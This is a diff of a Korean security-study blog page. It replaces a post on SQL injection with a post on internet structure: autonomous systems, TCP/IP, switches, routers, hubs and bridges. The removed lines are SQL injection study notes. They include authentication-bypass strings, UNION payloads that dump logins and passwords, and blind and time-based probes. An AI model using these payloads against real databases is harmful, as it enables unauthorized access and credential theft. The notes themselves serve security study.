@@ -12,7 +12,7 @@
 
 
 
-<title>SQL Injection | Sn0wD3er</title>
+<title>인터넷 모델 | Sn0wD3er</title>
 
 
 
@@ -173,7 +173,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">SQL Injection</h1>
+            <h1 class="post-title">인터넷 모델</h1>
             
                 <div class="post-meta">
                     
@@ -182,14 +182,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">November 15, 2020&nbsp;&nbsp;19:49:08</a>
+                        Date: <a href="#">November 17, 2020&nbsp;&nbsp;8:36:44</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="/categories/Web/">Web</a>
+                                <a href="/categories/Network/">Network</a>
                             
                         </span>
                     
@@ -198,56 +198,29 @@
         </header>
 
         <div class="post-content">
-            <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="인증-우회"><a href="#인증-우회" class="headerlink" title="인증 우회"></a>인증 우회</h3><ul>
-<li><p>인증 쿼리 질의문<br><code>Select * from members where id=&#39;&#39; and pass=&#39;&#39;</code></p>
-</li>
-<li><p><code>&#39; or 1=1 #</code></p>
-</li>
-<li><p><code>&#39; or &#39;x&#39;=&#39;x</code></p>
-</li>
-<li><p><code>&quot; or &quot;x&quot;=&quot;x</code></p>
-</li>
-<li><p><code>&#39;) or (&#39;x&#39;=&#39;x</code></p>
-</li>
-<li><p><code>&quot;) or (&quot;x&quot;=&quot;x</code></p>
-</li>
+            <h2 id="인터넷-모델"><a href="#인터넷-모델" class="headerlink" title="인터넷 모델"></a>인터넷 모델</h2><h3 id="AS"><a href="#AS" class="headerlink" title="AS"></a>AS</h3><p>AS는 ISP가 운영하는 인터넷 영역으로 여러 IP를 모은 IP 가상의 집합으로 IP 그룹이다.AS마다 번호가 붙고 AS는 BGP프로토콜이나 게이트웨이가 많이 이용한다.</p>
+<h3 id="인터넷-계층-모델-TCP-IP"><a href="#인터넷-계층-모델-TCP-IP" class="headerlink" title="인터넷 계층 모델 TCP/IP"></a>인터넷 계층 모델 TCP/IP</h3><p><img src="/img/tcpIP.PNG" alt="TCP/IP"><br>[^<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internet_protocol_suite]">https://en.wikipedia.org/wiki/Internet_protocol_suite]</a></p>
+<h3 id="인터넷-물리적-구조"><a href="#인터넷-물리적-구조" class="headerlink" title="인터넷 물리적 구조"></a>인터넷 물리적 구조</h3><p><img src="/img/internetstructure.PNG" alt="인터넷 물리적 구조"></p>
+<h4 id="Backbone-Network"><a href="#Backbone-Network" class="headerlink" title="Backbone Network"></a>Backbone Network</h4><ul>
+<li>빠른 속도로 서브넷을 연결시켜주는 역할을 한다. 주로 Router로 구성</li>
 </ul>
-<h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><ul>
-<li><code>0&#39; union select all 1,concat(id,login,password),3,4,concat(email,secret),6,7 from users#</code></li>
-<li><code>0&#39; union select all 1,2,3,4,5 #</code> </li>
-<li><code>&#39; union select all 1,2,3,4,5,6,7,8,9,10,11#</code></li>
-<li><code>&#39; union select all 1,2,database(),4,5,6,7#</code></li>
-<li><code>&#39; union select all 1,2,table_name,4,5,6,7,8 from information_schema.tables#</code></li>
-<li><code>&#39; union select all 1,2,column_name,4,5,6 from information_schema.columns where table_name=&#39;users&#39;#</code></li>
-<li><code>&#39; order by 10#</code> : 컬럼 개수 알아내기 컬럼 개수가 크면 에러가 나온다</li>
+<h4 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h4><ul>
+<li>PORT : 스위치 내부의 고유 포트번호, 다른 노드와 연결시켜주는 인터페이스이며 MAC Table이랑 포트번호랑 매치시켜 데이터를 전송함. 참고로 PROT는 물리적인 것으로 유선으로 연결되어 있음</li>
+<li>MAC 주소를 사용</li>
 </ul>
-<p>UNION SELECT ALL 다음 컬럼 값은 앞선 질의문의 쿼리문의 개수와 같아야한다. </p>
-<h3 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h3><ul>
-<li><code>&#39; or 1=1 and length(database())=5#</code></li>
-<li><code>&#39; or 1=1= and substring(database(),1,1)=&#39;b&#39;#</code></li>
-<li><code>&#39; or 1=1 and ascii(substring(database(),1,1))=98#</code></li>
+<h4 id="ROUTER"><a href="#ROUTER" class="headerlink" title="ROUTER"></a>ROUTER</h4><ul>
+<li>스위치랑 다르게 PORT대신 NIC를 가지고 있고 IP Table과 NIC와 매치시켜 경로를 설정해줌</li>
+<li>IP를 사용</li>
 </ul>
-<p>‘참’과 ‘거짓’의 결과만으로 결과를 얻어낸다.</p>
-<h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><ul>
-<li><code>&#39; or 1=1 and sleep(5)#</code></li>
+<h4 id="HUB"><a href="#HUB" class="headerlink" title="HUB"></a>HUB</h4><ul>
+<li>포트는 데이터 전송이 있을 때 모든 PORT에 전송한다. 따라서 모든 포트가 충돌영역 및 방송영역이다.</li>
 </ul>
-<p>sleep()함수를 이용해서 시간을 비교해서 원하는 결과를 얻는 방법, 하지만 시간도 많이 걸리고 제일 마지막에 시도하는 방법이다.</p>
-<h2 id="SQL-Injection-Cheat-Sheet"><a href="#SQL-Injection-Cheat-Sheet" class="headerlink" title="SQL Injection Cheat Sheet"></a>SQL Injection Cheat Sheet</h2><p><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
-<h2 id="My-SQL-Injection에-기본적으로-알아야-할-것들"><a href="#My-SQL-Injection에-기본적으로-알아야-할-것들" class="headerlink" title="My SQL Injection에 기본적으로 알아야 할 것들"></a>My SQL Injection에 기본적으로 알아야 할 것들</h2><ul>
-<li>@@version</li>
-<li>information_schema.tables<ul>
-<li>table_name</li>
+<h4 id="BRIDGE"><a href="#BRIDGE" class="headerlink" title="BRIDGE"></a>BRIDGE</h4><ul>
+<li>둘 이상의 네트워크를 상호 연결해주는 데이터링크 장비</li>
+<li>충돌 영역을 분할함</li>
 </ul>
-</li>
-<li>information_shcema.columns<ul>
-<li>column_name</li>
-</ul>
-</li>
-<li>database()</li>
-<li>length()</li>
-<li>substring(문자열,시작,개수)</li>
-<li>ascii()</li>
-<li>limit 시작,개수 : 컬럼을 하나씩 가져오기위해 사용</li>
+<h4 id="REPEATER"><a href="#REPEATER" class="headerlink" title="REPEATER"></a>REPEATER</h4><ul>
+<li>전송 신호를 증폭 시킴 </li>
 </ul>
 
         </div>
@@ -263,7 +236,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://sn0wd3er.github.io/2020/11/15/web/sqlInjection/2020-11-15-sqlInjection/">https://sn0wd3er.github.io/2020/11/15/web/sqlInjection/2020-11-15-sqlInjection/</a></span>
+                        <span><a href="https://sn0wd3er.github.io/2020/11/17/network/basic/2020-11-17-internetModel/">https://sn0wd3er.github.io/2020/11/17/network/basic/2020-11-17-internetModel/</a></span>
                     </p>
                 
                 
@@ -287,7 +260,9 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/SQL-Injection/"># SQL Injection</a>
+                        <a href="/tags/%EC%9D%B8%ED%84%B0%EB%84%B7-%EB%AA%A8%EB%8D%B8/"># 인터넷 모델</a>
+                    
+                        <a href="/tags/%EC%9D%B8%ED%84%B0%EB%84%B7-%EB%AC%BC%EB%A6%AC%EC%A0%81-%EA%B5%AC%EC%A1%B0/"># 인터넷 물리적 구조</a>
                     
                         
                 </span>
@@ -300,10 +275,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2020/11/16/network/basic/2020-11-16-osi/">OSI 7 Layer</a>
+                <a class="prev" rel="prev" href="/2020/11/17/forensics/windows/2020-11-17-registry/">Registry</a>
             
             
-            <a class="next" rel="next" href="/2020/11/15/reversing/windows/windowStructure/2020-11-15-pe/">PE 파일</a>
+            <a class="next" rel="next" href="/2020/11/17/reversing/windows/windowStructure/2020-11-17-importBounding/">Import Binding</a>
             
         </section>
 
